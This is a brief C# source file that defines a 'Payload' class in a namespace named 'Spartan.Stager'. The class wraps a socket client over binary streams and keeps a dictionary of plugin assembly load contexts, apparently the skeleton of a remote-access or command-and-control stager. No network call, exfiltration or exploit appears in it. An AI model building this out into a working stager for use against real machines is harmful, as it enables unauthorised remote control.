namespace Spartan.Stager;

public class Payload
{
    private readonly SocketClient _socketClient;
    private Dictionary<string, PluginAssemblyLoadContext> _pluginAssemblyLoadContexts = new();

    public Payload(BinaryReader binaryReader, BinaryWriter binaryWriter)
    {
        _socketClient = new SocketClient(binaryReader, binaryWriter);
    }
}